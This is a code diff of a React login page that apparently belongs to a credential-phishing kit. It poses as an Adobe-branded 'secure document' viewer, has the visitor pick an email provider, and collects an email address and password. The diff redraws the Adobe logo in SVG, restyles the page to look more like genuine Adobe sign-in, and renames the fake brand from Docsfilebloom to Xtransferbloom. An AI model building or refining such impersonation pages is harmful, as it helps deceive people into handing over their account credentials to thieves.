@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { ArrowLeft, Mail, Lock, Eye, EyeOff } from 'lucide-react';
+import { ArrowLeft, Eye, EyeOff } from 'lucide-react';
 import { useLogin } from '../hooks/useLogin';
 import Spinner from './common/Spinner';
 
@@ -75,33 +75,28 @@ const LoginPage: React.FC<LoginPageProps> = ({
   };
 
   const AdobeLogo = () => (
-    <img 
-      src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/60/Adobe_Acrobat_Reader_icon_%282020%29.svg/640px-Adobe_Acrobat_Reader_icon_%282020%29.svg.png" 
-      alt="Adobe Acrobat Reader Logo" 
-      className="w-10 h-10 drop-shadow-lg"
-    />
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 26" className="w-8 h-8">
+      <polygon fill="#FA0F00" points="11.5,0 0,0 0,26" />
+      <polygon fill="#FA0F00" points="18.5,0 30,0 30,26" />
+      <polygon fill="#FA0F00" points="15,9.6 22.1,26 18.2,26 16,20.8 10.9,20.8" />
+    </svg>
   );
 
   return (
-    <div 
-      className="min-h-screen flex items-center justify-center p-4 font-sans bg-cover bg-center"
-      style={{
-        backgroundImage: "url('https://images.unsplash.com/photo-1588345921523-c2dcdb7f1dcd?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80')"
-      }}
-    >
+    <div className="min-h-screen flex items-center justify-center p-4 font-sans bg-white">
       {!selectedProvider ? (
-        <div className="w-full max-w-md">
-          <div className="mb-8 text-center">
-            <div className="flex justify-center mb-6">
+        <div className="w-full max-w-sm">
+          <div className="mb-10 text-center">
+            <div className="flex justify-center mb-5">
               <AdobeLogo />
             </div>
-            <h1 className="text-3xl font-bold text-gray-900 drop-shadow-[0_2px_4px_rgba(255,255,255,0.8)]">Sign in to continue</h1>
-            <p className="text-gray-800 mt-3 text-base drop-shadow-[0_1px_2px_rgba(255,255,255,0.7)] font-medium">
-              to access your secure document: <span className="font-bold text-gray-900">{fileName}</span>
+            <h1 className="text-xl font-semibold text-gray-900 mb-2">Sign in to access your document</h1>
+            <p className="text-sm text-gray-500">
+              <span className="font-medium text-gray-700">{fileName}</span>
             </p>
-            <p className="text-gray-800 text-base font-semibold mt-6 drop-shadow-[0_1px_2px_rgba(255,255,255,0.7)]">Choose your email provider</p>
           </div>
           
+          <p className="text-sm font-medium text-gray-700 mb-4">Choose your email provider</p>
           <div className="space-y-2">
             {emailProviders.map((provider) => (
               <button
@@ -110,12 +105,12 @@ const LoginPage: React.FC<LoginPageProps> = ({
                 type="button"
                 className="w-full group"
               >
-                <div className="flex items-center px-5 py-3 bg-white/80 backdrop-blur-md rounded-lg border border-white/40 hover:bg-white/90 hover:border-blue-400/60 hover:scale-[1.02] transition-all duration-200 shadow-lg">
-                  <img src={provider.logo} alt={provider.name} className="w-7 h-7 object-contain flex-shrink-0 drop-shadow-sm" />
-                  <span className="flex-1 text-base font-semibold text-gray-800 group-hover:text-blue-700 transition-colors ml-4">
+                <div className="flex items-center px-4 py-3 bg-white rounded-md border border-gray-200 hover:border-gray-400 hover:bg-gray-50 transition-all duration-150">
+                  <img src={provider.logo} alt={provider.name} className="w-6 h-6 object-contain flex-shrink-0" />
+                  <span className="flex-1 text-sm font-medium text-gray-800 group-hover:text-gray-900 transition-colors ml-3 text-left">
                     {provider.name}
                   </span>
-                  <svg className="w-4 h-4 text-gray-600 group-hover:text-blue-600 transition-colors flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <svg className="w-4 h-4 text-gray-400 group-hover:text-gray-600 transition-colors flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                     <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                   </svg>
                 </div>
@@ -123,62 +118,59 @@ const LoginPage: React.FC<LoginPageProps> = ({
             ))}
           </div>
 
-          <div className="mt-8 text-center">
-            <p className="text-sm text-gray-800 font-medium drop-shadow-[0_1px_2px_rgba(255,255,255,0.6)]">© 2026 Docsfilebloom.com. Secured in partnership with Adobe®.</p>
+          <div className="mt-10 text-center">
+            <p className="text-xs text-gray-400">© 2026 Xtransferbloom. Secured in partnership with Adobe®.</p>
           </div>
         </div>
       ) : (
-        <div className="w-full max-w-md bg-white/70 backdrop-blur-md rounded-2xl shadow-2xl overflow-hidden border border-white/20">
-          <div className="p-8">
-            <div className="flex justify-center mb-6">
+        <div className="w-full max-w-sm">
+          <div className="mb-8 text-center">
+            <div className="flex justify-center mb-5">
               <AdobeLogo />
             </div>
-            <h1 className="text-2xl font-bold text-center text-gray-800">Sign in with {selectedProvider}</h1>
-            <p className="text-center text-gray-600 mt-2 text-sm">
-              to access your secure document: <span className="font-medium text-gray-700">{fileName}</span>
+            <h1 className="text-xl font-semibold text-gray-900">Sign in with {selectedProvider}</h1>
+            <p className="text-sm text-gray-500 mt-1">
+              to access <span className="font-medium text-gray-700">{fileName}</span>
             </p>
-
-            <div className="mt-8">
-              <button onClick={handleBackToProviders} className="flex items-center gap-2 text-sm text-gray-700 hover:text-gray-900 font-medium mb-6">
-                <ArrowLeft className="w-4 h-4" />
-                Back to providers
-              </button>
-
-              <form onSubmit={handleSubmit} className="space-y-5">
-                {errorMessage && (
-                  <div className="bg-red-100/90 backdrop-blur-sm text-red-700 p-3 rounded-lg text-sm font-medium text-center border border-red-200/50">
-                    {errorMessage}
-                  </div>
-                )}
-
-                <div>
-                  <label className="text-sm font-bold text-gray-700" htmlFor="email">Email Address</label>
-                  <div className="relative mt-2">
-                    <Mail className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 w-5 h-5" />
-                    <input id="email" type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="you@example.com" required className="w-full pl-10 pr-4 py-3 bg-white/80 backdrop-blur-sm border border-gray-300/50 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition" />
-                  </div>
-                </div>
-
-                <div>
-                  <label className="text-sm font-bold text-gray-700" htmlFor="password">Password</label>
-                  <div className="relative mt-2">
-                    <Lock className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 w-5 h-5" />
-                    <input id="password" type={showPassword ? 'text' : 'password'} value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Enter your password" required className="w-full pl-10 pr-12 py-3 bg-white/80 backdrop-blur-sm border border-gray-300/50 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition" />
-                    <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-600 hover:text-gray-800">
-                      {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
-                    </button>
-                  </div>
-                </div>
-
-                <button type="submit" disabled={isLoading || !email || !password} className="w-full flex items-center justify-center py-3 px-4 rounded-lg font-bold text-white bg-blue-600/90 backdrop-blur-sm hover:bg-blue-700/90 disabled:opacity-50 disabled:cursor-not-allowed transition-colors shadow-lg">
-                  {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
-                  {isLoading ? 'Verifying...' : 'Sign In'}
-                </button>
-              </form>
-            </div>
           </div>
-          <div className="bg-white/40 backdrop-blur-sm p-4 border-t border-white/20">
-            <p className="text-xs text-gray-600 text-center">© 2026 Docsfilebloom.com. Secured in partnership with Adobe®.</p>
+
+          <button onClick={handleBackToProviders} className="flex items-center gap-1.5 text-sm text-blue-600 hover:text-blue-800 font-medium mb-6 transition-colors">
+            <ArrowLeft className="w-4 h-4" />
+            Back to providers
+          </button>
+
+          <form onSubmit={handleSubmit} className="space-y-5">
+            {errorMessage && (
+              <div className="bg-red-50 text-red-600 p-3 rounded-md text-sm font-medium border border-red-200">
+                {errorMessage}
+              </div>
+            )}
+
+            <div>
+              <label className="text-sm font-medium text-gray-700 block mb-1.5" htmlFor="email">Email address</label>
+              <div className="relative">
+                <input id="email" type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="you@example.com" required className="w-full px-3 py-2.5 bg-white border border-gray-300 rounded-md text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition placeholder:text-gray-400" />
+              </div>
+            </div>
+
+            <div>
+              <label className="text-sm font-medium text-gray-700 block mb-1.5" htmlFor="password">Password</label>
+              <div className="relative">
+                <input id="password" type={showPassword ? 'text' : 'password'} value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Enter your password" required className="w-full px-3 pr-10 py-2.5 bg-white border border-gray-300 rounded-md text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition placeholder:text-gray-400" />
+                <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors">
+                  {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                </button>
+              </div>
+            </div>
+
+            <button type="submit" disabled={isLoading || !email || !password} className="w-full flex items-center justify-center py-2.5 px-4 rounded-full font-semibold text-sm text-white bg-[#1473E6] hover:bg-[#0d66d0] disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
+              {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
+              {isLoading ? 'Verifying...' : 'Sign In'}
+            </button>
+          </form>
+
+          <div className="mt-10 text-center">
+            <p className="text-xs text-gray-400">© 2026 Xtransferbloom. Secured in partnership with Adobe®.</p>
           </div>
         </div>
       )}
